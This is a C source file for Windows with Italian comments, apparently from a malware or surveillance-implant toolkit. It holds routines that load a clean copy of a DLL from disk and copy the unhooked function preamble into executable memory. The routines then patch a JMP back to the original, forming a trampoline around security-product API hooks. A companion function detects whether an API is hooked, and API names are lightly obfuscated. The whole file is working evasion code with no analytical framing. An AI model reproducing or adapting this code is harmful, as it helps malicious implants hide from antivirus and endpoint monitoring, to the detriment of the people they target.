#include <Windows.h>
#include "HM_PreamblePatch.h"
#include "HM_SafeProcedures.h"
#include "common.h"
#include "DynamiCall/dynamic_import.h"

// Deve essere globale
LOADED_IMAGE HM_LoadLibrary_li;

// Ritorna il numero di byte letti, oppure 0 in caso di errore.
// La funzione carica e libera (con la NOSTRA HM_LoadLibrary/HM_FreeLibrary)
// la DLL dal disco, la riloca e prende il puntatore alla funzione pFunc.
// In pStub viene messo l'indirizzo di una zona di memoria in cui vengono
// copiati uToRead byte della funzione originale, e sicuramente non hookata,
// e poi viene assemblato un JMP all'indirizzo della DLL originale.
UINT HM_ReadFunction(PCHAR pDll, PCHAR pFunc, UINT uToRead, PBYTE *pStub)
{
	int hMod;
	UINT uCount = 0, uRet;
	PBYTE pPreamble = NULL, pIter = NULL, pCode = NULL;
	char *pClear;

	if(uToRead == 0 || pDll == NULL || pFunc == NULL)
		return 0;

	hMod = HM_LoadLibrary(pDll);

	if(hMod == 0)
		return 0;

	pClear = strdup(pFunc);
	if (!pClear)
		return 0;
	shiftBy1(pClear);

	pIter = pPreamble = (PBYTE)HM_SafeGetProcAddress((HMODULE)hMod, pClear);

	if(pPreamble == 0){
		HM_FreeLibrary((PVOID)hMod);
		SAFE_FREE(pClear);
		return 0;
	}

	//while(uCount < uToRead && uCount < uToRead + BYTE_READ_THRESHOLD){
	while(uCount < uToRead){
		uRet = HM_sCodeAlign(pIter);
		uCount += uRet;
		pIter += uRet;
	}

	// +5 perche' dobbiamo allocare anche lo spazio per il JMP di ritorno
	*pStub = (PBYTE)HM_SafeVirtualAllocEx(FNC(GetCurrentProcess)(), NULL, uCount + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if(*pStub == 0){
		HM_FreeLibrary((PVOID)hMod);
		SAFE_FREE(pClear);
		return 0;
	}

	uCount = 0;
	pIter = pPreamble;
	pCode = *pStub;

	//while(uCount < uToRead && uCount < uToRead + BYTE_READ_THRESHOLD){
	while(uCount < uToRead){
		uRet = HM_sCodeAlign(pIter);
		memcpy(pCode, pIter, uRet);
		uCount += uRet;
		pIter += uRet;
		pCode += uRet;
	}

	HM_FreeLibrary((PVOID)hMod);
	if (!HM_AssembleReturnJump(pDll, pClear, uCount, pCode)) {
		// XXX ho aggiunto la free
		VirtualFree(*pStub, 0, MEM_RELEASE);
		*pStub = NULL;
		SAFE_FREE(pClear);
		return 0;
	}

	SAFE_FREE(pClear);
	return uCount;
}

// Torna FALSE in caso di errore, TRUE altrimenti.
// Questa funzione carica pDll, trova l'indirizzo di pFunc e scrive
// dentro pCode un JMP alla libreria originale.
// La libreria caricata non viene intenzionalmente liberata perche'
// comunque verra' usata dal programma.
BOOL HM_AssembleReturnJump(PCHAR pDll, PCHAR pFunc, UINT uDisp, PBYTE pCode)
{
	HMODULE hMod;
	PBYTE func;
	UINT uOffset;
	PUINT uTmp;

	if(pDll == NULL || pFunc == NULL || pCode == NULL)
		return FALSE;

	hMod = LoadLibrary(pDll);

	if(hMod == NULL)
		return FALSE;

	func = (PBYTE)HM_SafeGetProcAddress(hMod, pFunc);

	if(func == NULL)
		return FALSE;

	func += uDisp;
	uOffset = func - pCode - 5;

	*pCode = 0xE9; // JMP
	pCode++;

	uTmp = (UINT *)pCode; // Indirizzo
	*uTmp = uOffset;

	return TRUE;
}

int HM_LoadLibrary(PCHAR pPath)
{
	CHAR name[MAX_PATH + 1] = {0};

	if(FNC(MapAndLoad)(pPath, NULL, &HM_LoadLibrary_li, TRUE, TRUE) == FALSE)
		return 0;

	// Inizializza il path per la loadDll()
	name[0] = '\\';
	strncat_s(name, MAX_PATH, pPath, strlen(pPath));

	return (int)loadDLL(name);
}

int HM_FreeLibrary(PVOID pPtr)
{
	if(pPtr == NULL)
		return 0;

	FNC(VirtualFreeEx)(FNC(GetCurrentProcess)(), pPtr, 0, MEM_RELEASE);

	return FNC(UnMapAndLoad)(&HM_LoadLibrary_li);
}

// Il nome della funzione deve essere shiftato di 1
BOOL HM_IsWrapped(PCHAR pDll, PCHAR pFunc)
{
	PBYTE func;
	char *pClear;

	pClear = strdup(pFunc);
	if (!pClear)
		return TRUE;

	shiftBy1(pClear);
	func = (PBYTE)HM_SafeGetProcAddress(GetModuleHandle(pDll), pClear);
	SAFE_FREE(pClear);

	if (func == NULL)
		return TRUE;

	if(*func == 0xE8 || *func == 0xE9) { // JMP e CALL 
		if (func[5]==0x90 && func[6]==0x90 && func[7]==0x90 && func[8]==0x90 && func[9]==0x90)
			return FALSE; // Caso di Blink (182)

		return TRUE;
	}

	return FALSE;
}
